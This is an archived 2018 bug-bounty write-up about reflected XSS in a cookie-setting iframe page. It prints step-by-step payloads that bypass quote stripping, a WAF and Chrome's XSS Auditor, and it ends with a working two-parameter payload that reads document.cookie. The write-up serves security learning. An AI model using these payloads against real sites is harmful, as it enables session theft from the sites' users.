---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-12_magic-xss-with-two-parameters.md
original_filename: 2018-10-12_magic-xss-with-two-parameters.md
title: Magic XSS with two parameters
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 72cad6db0cd756b3b2fcede293ba8b91c7fe1bfad5f16468aa080546834e3c7e
text_sha256: 0a6acd6b8cb01f6a265afa51d7b0e16295ceedb51c519fc65314e6ae1cbe014d
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Magic XSS with two parameters

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-12_magic-xss-with-two-parameters.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `72cad6db0cd756b3b2fcede293ba8b91c7fe1bfad5f16468aa080546834e3c7e`
- Text SHA256: `0a6acd6b8cb01f6a265afa51d7b0e16295ceedb51c519fc65314e6ae1cbe014d`


## Content

---
title: "Magic XSS with two parameters"
url: "https://medium.com/@m4shahab1/magic-xss-with-two-parameters-463559b03949"
authors: ["Mahmood Shahabi (@m4shahab1)"]
bugs: ["XSS"]
publication_date: "2018-10-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5646
scraped_via: "browseros"
---

# Magic XSS with two parameters

Magic XSS with two parameters
Mahmood Shahabi
Follow
2 min read
·
Oct 12, 2018

121

I recently worked on bug bounty program. one of in scope websites has used an iframe like below to set a cookie for visitors.

<iframe src=“http://example.com/setcookie?key=name&value=value”></iframe>

The iframe use javascript to set cookie instead of Set-Cookie header. key parameter is name of cookie and value parameter is its value. the javascript code is written similar to this

<html>
 <body>
  <script>
  if ('name' != '') {
  if (window.location.indexOf('exmaple.com') != -1) {
  document.cookie = 'name' + "=" + 'value' + ";domain=example.com";
  } else {
  document.cookie = 'name' + "=" + 'value';
  }
  }
  </script>
 </body>
</html>

The code is suitable for XSS attack vector. So I tried to close string 'name' with adding single quote to parameter and inject own javascript code in page but at server side, single quotes are replaced with empty string. They think this work can stop XSS attack but there are alternative ways to closing the string.

Get Mahmood Shahabi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

First way is add newline like this /?key=name%0a&value=value

<html>
 <body>
  <script>
  if ('name
' != '') {
  if (window.location.indexOf('exmaple.com') != -1) {
  document.cookie = 'name
' + "=" + 'value' + ";domain=example.com";
  } else {
  document.cookie = 'name
' + "=" + 'value';
  }
  }
  </script>
 </body>
</html>

Second way is escaping close single quote with backslash. /?key=name\&value=value

<html>
 <body>
  <script>
  if ('name\' != '') {
  if (window.location.indexOf('exmaple.com') != -1) {
  document.cookie = 'name\' + "=" + 'value' + ";domain=example.com";
  } else {
  document.cookie = 'name\' + "=" + 'value';
  }
  }
  </script>
 </body>
</html>

at line document.cookie = 'name\' + "=" + 'value'; the string closed by starting single quote of second string. Now value of value parameter is parsed as code -not data. So I try to inject payload in value parameter like /?key=name\&value=;alert(1);//

<html>
 <body>
  <script>
  if ('name\' != '') {
  if (window.location.indexOf('exmaple.com') != -1) {
  document.cookie = 'name\' + "=" + ';alert(1);//' + ";domain=example.com";
  } else {
  document.cookie = 'name\' + "=" + ';alert(1);//';
  }
  }
  </script>
 </body>
</html>

There is still a problem. An error occur at if ('name\' != '') { because of unclosed string and interpreter doesn’t execute alert(1). So I try to use alternative way to pass error. The new payload use </script><script> and like this /?key=name%0a</script><script>alert(1);</script>&value=value but the request is blocked by WAF. Add newline is bypass WAF in a simple way. /?key=name%0a</script><script>alert(1);%0a</script>&value=value. Unfortunately, Google Chrome XSS Auditor detects and blocks last payload. Now the second parameter comes in. I split payload in two parameters and generate final payload that is working. /?key=name%0a</script></script>alert(&value=%2bdocument.cookie);%0a</script>

Press enter or click to view image in full size
alert(document.cookie)

Note: you can find a simple server code that simulate this challenge here

Note: I have seen Google Chrome XSS auditor bypass with two parameters many years ago that is used multiline comment /* */ and was patched but you can see it’s work with some changes (using <script>)
